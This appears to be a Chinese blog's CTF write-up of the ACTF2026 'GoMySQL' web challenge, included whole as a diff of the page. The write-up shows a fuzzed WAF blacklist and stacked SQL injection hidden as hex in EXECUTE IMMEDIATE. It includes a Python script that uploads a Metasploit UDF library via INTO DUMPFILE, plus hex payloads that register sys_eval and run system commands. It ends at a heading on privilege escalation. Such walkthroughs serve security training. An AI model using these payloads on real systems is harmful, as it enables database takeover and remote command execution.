@@ -1,0 +1,936 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    ACTF2026 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="GoMySQL的模板注入绕死我了😵‍💫   Web  GoMySQL   题目分析  首先看到&#x2F;calc路由：一个类似计算器一样的东西    加个单引号报错了，猜测存在SQL注入漏洞，这里提示后端用的是MariaDB服务  MariaDB服务器是一个流行的关系型数据库管理系统（RDBMS）。 简单来说，它是一个用来存放和管理数据的软件。你可以把它理解为一个功能强大的“电子表格仓库”，但能处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF2026">
+<meta property="og:url" content="http://example.com/2026/05/26/ACTF2026/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="GoMySQL的模板注入绕死我了😵‍💫   Web  GoMySQL   题目分析  首先看到&#x2F;calc路由：一个类似计算器一样的东西    加个单引号报错了，猜测存在SQL注入漏洞，这里提示后端用的是MariaDB服务  MariaDB服务器是一个流行的关系型数据库管理系统（RDBMS）。 简单来说，它是一个用来存放和管理数据的软件。你可以把它理解为一个功能强大的“电子表格仓库”，但能处理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526004812194.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526004902121.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526005025014.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526005058167.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526005120599.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526010551784.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526010637362.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526010708347.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526012516502.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526012610418.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/3594534-20260522110716142-1952299553.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526110719701.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526112058945.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526113006090.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526113204634.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526113318351.png">
+<meta property="og:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/3594534-20260522110713823-1801094566.png">
+<meta property="article:published_time" content="2026-05-25T16:13:38.000Z">
+<meta property="article:modified_time" content="2026-05-26T04:30:01.844Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/05/26/ACTF2026/ACTF2026.assets/image-20260526004812194.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="ACTF2026">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">ACTF2026</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gomysql"><span class="toc-number">1.1.</span> <span class="toc-text"> GoMySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-execute-immediate%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text"> SQL堆叠注入-EXECUTE IMMEDIATE绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-udf%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.</span> <span class="toc-text"> SQL堆叠注入-UDF提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-copy-fail-%E8%A6%86%E7%9B%96-pam-%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 非预期-copy-fail 覆盖 PAM 配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3-draw%E6%A8%A1%E6%9D%BFrce"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 预期解-&#x2F;draw模板rce</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88exp"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 最终exp</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-ACTF2026" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/05/26/ACTF2026/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-05-25T16:13:38.000Z" itemprop="datePublished">2026-05-26</time>
+    <time style="display: none;" id="post-update-time">2026-05-26</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <blockquote>
+<p>GoMySQL的模板注入绕死我了😵‍💫</p>
+</blockquote>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="gomysql"><a class="markdownIt-Anchor" href="#gomysql"></a> GoMySQL</h3>
+<p><img src="ACTF2026.assets/image-20260526004812194.png" alt="image-20260526004812194" /></p>
+<h4 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h4>
+<p><img src="ACTF2026.assets/image-20260526004902121.png" alt="image-20260526004902121" /></p>
+<p>首先看到<code>/calc</code>路由：一个类似计算器一样的东西</p>
+<p><img src="ACTF2026.assets/image-20260526005025014.png" alt="image-20260526005025014" /></p>
+<p><img src="ACTF2026.assets/image-20260526005058167.png" alt="image-20260526005058167" /></p>
+<p><img src="ACTF2026.assets/image-20260526005120599.png" alt="image-20260526005120599" /></p>
+<p>加个单引号报错了，猜测存在SQL注入漏洞，这里提示后端用的是MariaDB服务</p>
+<blockquote>
+<p><strong>MariaDB服务器</strong>是一个流行的<strong>关系型数据库管理系统</strong>（RDBMS）。</p>
+<p>简单来说，它是一个用来存放和管理数据的软件。你可以把它理解为一个功能强大的“电子表格仓库”，但能处理比Excel多出百万倍的数据，并允许成千上万的用户同时读取或写入。</p>
+</blockquote>
+<p>继续尝试了一下发现存在waf，fuzz一下黑名单：<br />
+<code>= set into drop union alter select delete insert create schema update _ prepare outfile update</code></p>
+<p>再看<code>/draw</code>路由：输入名字抽取号码</p>
+<p><img src="ACTF2026.assets/image-20260526010551784.png" alt="image-20260526010551784" /></p>
+<p><img src="ACTF2026.assets/image-20260526010637362.png" alt="image-20260526010637362" /></p>
+<p>加个单引号显示<code>access denied</code></p>
+<p><img src="ACTF2026.assets/image-20260526010708347.png" alt="image-20260526010708347" /></p>
+<p>暂时不知道有什么用</p>
+<h4 id="sql堆叠注入-execute-immediate绕过"><a class="markdownIt-Anchor" href="#sql堆叠注入-execute-immediate绕过"></a> SQL堆叠注入-EXECUTE IMMEDIATE绕过</h4>
+<p>测试了一下，发现<code>/calc</code>路由存在堆叠注入：<br />
+<img src="ACTF2026.assets/image-20260526012516502.png" alt="image-20260526012516502" /></p>
+<p>返回了十进制 ASCII值</p>
+<p><img src="ACTF2026.assets/image-20260526012610418.png" alt="image-20260526012610418" /></p>
+<p>结合输入输出，猜测后端SQL语句是<code>select %s</code>，从而形成了类似计算器一样的东西。同时数据库连接开启了<code>multiStatements=true</code></p>
+<p>这里发现<code>EXECUTE IMMEDIATE</code>没被禁，可以用16进制编码绕过</p>
+<p>先看看数据库版本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; <span class="keyword">EXECUTE</span> IMMEDIATE <span class="number">0x53454C4543542056455253494F4E2829</span></span><br><span class="line">#VERSION(): [<span class="number">49</span> <span class="number">48</span> <span class="number">46</span> <span class="number">49</span> <span class="number">49</span> <span class="number">46</span> <span class="number">49</span> <span class="number">52</span> <span class="number">45</span> <span class="number">77</span> <span class="number">97</span> <span class="number">114</span> <span class="number">105</span> <span class="number">97</span> <span class="number">68</span> <span class="number">66</span> <span class="number">45</span> <span class="number">48</span> <span class="number">43</span> <span class="number">100</span> <span class="number">101</span> <span class="number">98</span> <span class="number">49</span> <span class="number">50</span> <span class="number">117</span> <span class="number">50</span>]</span><br></pre></td></tr></table></figure>
+<p>是<code>10.11.14-MariaDB-0+deb12u2</code></p>
+<p>我们后面肯定目标是拿shell</p>
+<p>看看能否load_file：</p>
+<blockquote>
+<p>任意文件读取还能用自定义函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rf(p text)</span><br><span class="line"><span class="keyword">returns</span> longtext</span><br><span class="line"><span class="keyword">return</span> load_file(p)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="ACTF2026.assets/3594534-20260522110716142-1952299553.png" alt="img" /></p>
+<p>再看看能否写文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span></span><br><span class="line">#Variable_name: [<span class="number">115</span> <span class="number">101</span> <span class="number">99</span> <span class="number">117</span> <span class="number">114</span> <span class="number">101</span> <span class="number">95</span> <span class="number">97</span> <span class="number">117</span> <span class="number">116</span> <span class="number">104</span>], <span class="keyword">Value</span>: [<span class="number">79</span> <span class="number">78</span>]</span><br><span class="line">#Variable_name: [<span class="number">115</span> <span class="number">101</span> <span class="number">99</span> <span class="number">117</span> <span class="number">114</span> <span class="number">101</span> <span class="number">95</span> <span class="number">102</span> <span class="number">105</span> <span class="number">108</span> <span class="number">101</span> <span class="number">95</span> <span class="number">112</span> <span class="number">114</span> <span class="number">105</span> <span class="number">118</span>], <span class="keyword">Value</span>: []</span><br><span class="line">#Variable_name: [<span class="number">115</span> <span class="number">101</span> <span class="number">99</span> <span class="number">117</span> <span class="number">114</span> <span class="number">101</span> <span class="number">95</span> <span class="number">116</span> <span class="number">105</span> <span class="number">109</span> <span class="number">101</span> <span class="number">115</span> <span class="number">116</span> <span class="number">97</span> <span class="number">109</span> <span class="number">112</span>], <span class="keyword">Value</span>: [<span class="number">78</span> <span class="number">79</span>]</span><br></pre></td></tr></table></figure>
+<p><img src="ACTF2026.assets/image-20260526110719701.png" alt="image-20260526110719701" /></p>
+<p>secure_file_priv 是 null，可以写 shell，但这里的环境不确定，无法写shell</p>
+<h4 id="sql堆叠注入-udf提权"><a class="markdownIt-Anchor" href="#sql堆叠注入-udf提权"></a> SQL堆叠注入-UDF提权</h4>
+<p>那就想到能否在SQL语句中执行命令，也就是UDF提权</p>
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">上传恶意 so</span><br><span class="line">→ CREATE FUNCTION</span><br><span class="line">→ SQL 调用</span><br><span class="line">→ 系统命令执行</span><br></pre></td></tr></table></figure>
+<p>先查看mysql的插件目录：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;plugin%&#x27;</span>;</span><br><span class="line">#或者：<span class="number">1</span>;<span class="keyword">EXECUTE</span> IMMEDIATE concat(&quot;sel&quot;, &quot;ect &quot;, unhex(<span class="string">&#x27;40&#x27;</span>), unhex(<span class="string">&#x27;40&#x27;</span>), &quot;plugin&quot;, unhex(<span class="string">&#x27;5f&#x27;</span>), &quot;dir&quot;)</span><br><span class="line">#即<span class="keyword">select</span> @<span class="variable">@plugin_dir</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><code>plugin_dir</code> = <code>/usr/lib/mysql/plugin/</code></p>
+</li>
+<li>
+<p><code>plugin_maturity</code> = <code>gamma</code></p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+<p>下载 so 文件，ai 写个脚本上传进去：<br />
+原始payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0</span>x<span class="operator">&lt;</span>so_hex<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/lib.so&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">CALC_URL = <span class="string">&quot;http://8080-e6f59058-29d4-4093-8212-0eedf3af13b0.challenge.ctfplus.cn/calc&quot;</span></span><br><span class="line">SO_PATH = <span class="string">&quot;lib_mysqludf_sys_64.so&quot;</span></span><br><span class="line">REMOTE_SO = <span class="string">&quot;/usr/lib/mysql/plugin/udf64.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_bytes</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(data).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_sql</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sql.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_upload_payload</span>(<span class="params">so_path: <span class="built_in">str</span>, remote_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    so_bytes = pathlib.Path(so_path).read_bytes()</span><br><span class="line">    so_hex = to_hex_bytes(so_bytes)</span><br><span class="line">    inner_sql = <span class="string">f&quot;select 0x<span class="subst">&#123;so_hex&#125;</span> into dumpfile &#x27;<span class="subst">&#123;remote_path&#125;</span>&#x27;&quot;</span></span><br><span class="line">    inner_sql_hex = to_hex_sql(inner_sql)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;1;execute immediate 0x<span class="subst">&#123;inner_sql_hex&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_expr</span>(<span class="params">url: <span class="built_in">str</span>, expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;expression&quot;</span>: expr&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = build_upload_payload(SO_PATH, REMOTE_SO)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;payload length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>)</span><br><span class="line">    html = post_expr(CALC_URL, payload)</span><br><span class="line">    <span class="built_in">print</span>(html[:<span class="number">2000</span>])</span><br></pre></td></tr></table></figure>
+<p><img src="ACTF2026.assets/image-20260526112058945.png" alt="image-20260526112058945" /></p>
+<p>然后执行注册：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf64.so&#x27;</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;udf64.so&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>绕waf版本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; <span class="keyword">EXECUTE</span> IMMEDIATE <span class="number">0x4352454154452046554E4354494F4E207379735F6576616C2052455455524E5320737472696E6720534F4E414D45202775646636342E736F27</span></span><br><span class="line"><span class="number">1</span>; <span class="keyword">EXECUTE</span> IMMEDIATE <span class="number">0x4352454154452046554E4354494F4E207379735F657865632052455455524E5320696E746567657220534F4E414D45202775646636342E736F27</span></span><br></pre></td></tr></table></figure>
+<p>可以用 <code>count(*) from mysql.func</code> 查看有没有写入</p>
+<p><img src="ACTF2026.assets/image-20260526113006090.png" alt="image-20260526113006090" /></p>
+<p>成功</p>
+<p>这里用sys_eval执行系统命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line"><span class="number">1</span>;<span class="keyword">execute</span> immediate <span class="number">0x73656C656374207379735F6576616C28276C73202F2729</span></span><br></pre></td></tr></table></figure>
+<p><img src="ACTF2026.assets/image-20260526113204634.png" alt="image-20260526113204634" /></p>
+<p>解码后：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">flag.default</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+<p>读flag发现读不了</p>
+<p>看看权限：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">execute</span> immediate <span class="number">0x73656C656374207379735F6576616C282777686F616D692729</span></span><br></pre></td></tr></table></figure>
+<p><img src="ACTF2026.assets/image-20260526113318351.png" alt="image-20260526113318351" /></p>
+<p>是<code>mysql</code>用户权限</p>
+<h4 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h4>
+<h5 id="非预期-copy-fail-覆盖-pam-配置"><a class="markdownIt-Anchor" href="#非预期-copy-fail-覆盖-pam-配置"></a> 非预期-copy-fail 覆盖 PAM 配置</h5>
